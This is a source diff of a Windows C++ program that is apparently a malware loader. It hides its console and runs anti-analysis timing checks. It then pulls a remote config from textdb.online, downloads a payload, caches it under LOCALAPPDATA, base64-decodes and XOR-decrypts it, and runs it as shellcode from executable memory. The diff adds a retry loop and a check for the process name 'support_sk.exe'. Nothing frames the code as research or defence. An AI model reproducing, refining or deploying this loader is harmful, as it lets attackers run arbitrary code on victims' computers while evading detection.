@@ -1,5 +1,5 @@
 // x86_64-w64-mingw32-windres new2.rc -O coff -o new2.res
-// x86_64-w64-mingw32-g++ new2.cpp new2.res -lwininet -static-libgcc -static-libstdc++ -Os -s -fno-exceptions -fno-rtti -ffunction-sections -fdata-sections -Wl,--gc-sections -o a.exe
+// x86_64-w64-mingw32-g++ new2.cpp new2.res -lwininet -static-libgcc -static-libstdc++ -O1 -o a.exe
 
 #include <windows.h>
 #include <thread>
@@ -21,6 +21,7 @@ void isTimeAccelerated() {
         double* pvalue = new double;
         *pvalue = 29494.99;
         delete pvalue;
+        // isTimeAccelerated();
     }
 }
 
@@ -168,7 +169,10 @@ const char* find_value(const char* json, const char* key) {
 vector<unsigned char> load_from_cache(const char* version) {
     vector<unsigned char> data;
     char path[MAX_PATH];
-    GetTempPathA(MAX_PATH, path);
+    // GetTempPathA(MAX_PATH, path);
+    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
+    strcat_s(path, MAX_PATH, "\\sk\\");
+    CreateDirectoryA(path, NULL);
     lstrcatA(path, version);
     
     HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -184,7 +188,10 @@ vector<unsigned char> load_from_cache(const char* version) {
 
 void save_to_cache(const char* version, const vector<unsigned char>& data) {
     char path[MAX_PATH];
-    GetTempPathA(MAX_PATH, path);
+    // GetTempPathA(MAX_PATH, path);
+    GetEnvironmentVariableA("LOCALAPPDATA", path, MAX_PATH);
+    strcat_s(path, MAX_PATH, "\\sk\\");
+    CreateDirectoryA(path, NULL);
     lstrcatA(path, version);
     
     HANDLE hFile = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -204,43 +211,59 @@ bool CheckProcessName() {
     return _stricmp(filename, "support_sk.exe") == 0;
 }
 
+bool rte() {
+    return true;
+}
+
 int main() {
     FreeConsole();
 
-    isTimeAccelerated();
     ddt();
+    isTimeAccelerated();
     
-    vector<unsigned char> configData = download_to_memory("https://textdb.online/asapaka");
-    if (configData.empty()) return -1;
-    
-    const char* json = (const char*)configData.data();
-    const char* enable = find_value(json, "enable");
-    if (!enable || lstrcmpA(enable, "true") != 0) return -1;
-    
-    const char* version = find_value(json, "version");
-    const char* file_url = find_value(json, CheckProcessName() ? "file_url" : "file_url_first");
-    const char* ps = find_value(json, "ps");
-    if (!version || !file_url || !ps) return -2;
+    while (rte()) {
+        vector<unsigned char> configData = download_to_memory("https://textdb.online/asapaka");
+        if (configData.empty()) {
+            this_thread::sleep_for(seconds(5));
+            continue;
+        }
 
-    vector<unsigned char> fileData = load_from_cache(version);
-    if (fileData.empty()) {
-        fileData = download_to_memory(file_url);
-        if (fileData.empty()) return -3;
-        save_to_cache(version, fileData);
+        const char* json = (const char*)configData.data();
+        const char* enable = find_value(json, "enable");
+        if (!enable || lstrcmpA(enable, "true") != 0) {
+            this_thread::sleep_for(seconds(5));
+            continue;
+        }
+
+        const char* version = find_value(json, CheckProcessName() ? "version" : "version_first");
+        const char* file_url = find_value(json, CheckProcessName() ? "file_url" : "file_url_first");
+        const char* ps = find_value(json, "ps");
+        if (!version || !file_url || !ps) {
+            this_thread::sleep_for(seconds(5));
+            continue;
+        }
+        vector<unsigned char> fileData = load_from_cache(version);
+        if (fileData.empty()) {
+            fileData = download_to_memory(file_url);
+            if (fileData.empty()) {
+                this_thread::sleep_for(seconds(5));
+                continue;
+            }
+            save_to_cache(version, fileData);
+        }
+        fileData = base64_decode((const char*)fileData.data(), fileData.size());
+        apply_xor(fileData, ps, lstrlenA(ps));
+
+        LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        if (!execMemory) return -4;
+
+        memcpy(execMemory, fileData.data(), fileData.size());
+
+        typedef void (*ShellcodeFunc)();
+        ShellcodeFunc shellcodeFunc = (ShellcodeFunc)execMemory;
+        shellcodeFunc();
+
+        VirtualFree(execMemory, 0, MEM_RELEASE);
+        return 0;
     }
-    
-    fileData = base64_decode((const char*)fileData.data(), fileData.size());
-    apply_xor(fileData, ps, lstrlenA(ps));
-    
-    LPVOID execMemory = VirtualAlloc(NULL, fileData.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
-    if (!execMemory) return -4;
-    
-    memcpy(execMemory, fileData.data(), fileData.size());
-    
-    typedef void (*ShellcodeFunc)();
-    ShellcodeFunc shellcodeFunc = (ShellcodeFunc)execMemory;
-    shellcodeFunc();
-    
-    VirtualFree(execMemory, 0, MEM_RELEASE);
-    return 0;
 }
